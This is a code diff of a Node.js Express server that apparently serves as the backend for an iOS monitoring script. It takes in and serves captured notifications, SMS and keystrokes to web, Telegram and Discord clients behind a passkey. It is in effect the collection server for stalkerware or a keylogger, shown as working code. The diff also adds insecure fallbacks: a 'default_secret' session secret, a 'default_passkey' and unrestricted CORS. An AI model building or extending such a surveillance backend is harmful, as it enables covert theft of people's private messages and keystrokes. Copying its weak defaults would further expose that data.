@@ -1,34 +1,29 @@
+// server.js
 const express = require('express');
-const session = require('express-session');
-const FileStore = require('session-file-store')(session);
-const cors = require('cors');
 const bodyParser = require('body-parser');
+const cors = require('cors');
+const session = require('express-session');
+const FileStore = require('file-store')(session); // File-based session storage
+require('dotenv').config(); // Load environment variables
 
 const app = express();
 
-// Middleware
-app.use(cors({
-    origin: 'https://iosx.vercel.app', // Your frontend URL
-    credentials: true // Allow credentials to be sent
-}));
+// Middleware setup
+app.use(cors());
+app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
+
+// Session configuration with FileStore
 app.use(session({
-    store: new FileStore(), // Use FileStore for sessions
-    secret: '507402e9bca79ed5711bb5b3cec082b9c9c8846bfe2405dbc8e0da3ca445acc0', // Replace with your actual secret key
+    store: new FileStore({ path: './sessions' }), // Specify the directory for session files
+    secret: process.env.SESSION_SECRET || 'default_secret',
     resave: false,
-    saveUninitialized: false,
-    cookie: { 
-        maxAge: 86400000, // Set cookie to expire in 1 day (24 hours)
-        httpOnly: true,
-        secure: false, // Set to true if using HTTPS in production
-        sameSite: 'none'
-    }
+    saveUninitialized: true,
+    cookie: { secure: process.env.NODE_ENV === 'production' }
 }));
 
-
-// Replace with your actual passkey
-const correctPasskey = "9ecd92e21bb795a6064f1c9c6cc4fb9b";
-
+// Your activity tracking data and routes
+const correctPasskey = process.env.PASSKEY || "default_passkey";
 let activityData = {
     Notifications: '',
     SMS: '',
@@ -40,13 +35,11 @@ let activityData = {
     Keystrokes: ''
 };
 
-// Login endpoint to authenticate the user
+// Login endpoint
 app.post('/login', (req, res) => {
     const { passkey } = req.body;
-    
-    // Check if passkey matches
     if (passkey === correctPasskey) {
-        req.session.authenticated = true; // Set session auth flag
+        req.session.authenticated = true;
         res.status(200).json({ message: "Login successful" });
     } else {
         res.status(401).json({ message: "Incorrect passkey" });
@@ -62,30 +55,30 @@ function isAuthenticated(req, res, next) {
     }
 }
 
-// Endpoint for iOS Monitoring Script to send data
+// Endpoint to receive monitoring data
 app.post('/monitor', isAuthenticated, (req, res) => {
     const { activityType, data } = req.body;
     if (activityType && activityData[activityType] !== undefined) {
         activityData[activityType] = data;
         res.sendStatus(200);
     } else {
-        res.sendStatus(400);
+        res.status(400).json({ message: "Invalid activity type" });
     }
 });
 
-// Endpoint for clients (Web UI, Telegram, Discord) to fetch data for a specific activity
+// Endpoint to fetch activity data for authenticated clients
 app.get('/fetch/:activityType', isAuthenticated, (req, res) => {
     const { activityType } = req.params;
-    res.json({ data: activityData[activityType] || "No data available" });
+    if (activityData[activityType] !== undefined) {
+        res.json({ data: activityData[activityType] || "No data available" });
+    } else {
+        res.status(400).json({ message: "Invalid activity type" });
+    }
 });
 
 // Endpoint to check authentication status
 app.get('/auth-status', (req, res) => {
-    if (req.session.authenticated) {
-        res.status(200).json({ authenticated: true });
-    } else {
-        res.status(401).json({ authenticated: false });
-    }
+    res.status(200).json({ authenticated: !!req.session.authenticated });
 });
 
 // Logout endpoint
@@ -95,6 +88,8 @@ app.post('/logout', (req, res) => {
     });
 });
 
-app.listen(3000, () => {
-    console.log('Server running on http://localhost:3000');
+// Start server
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server running on http://localhost:${PORT}`);
 });
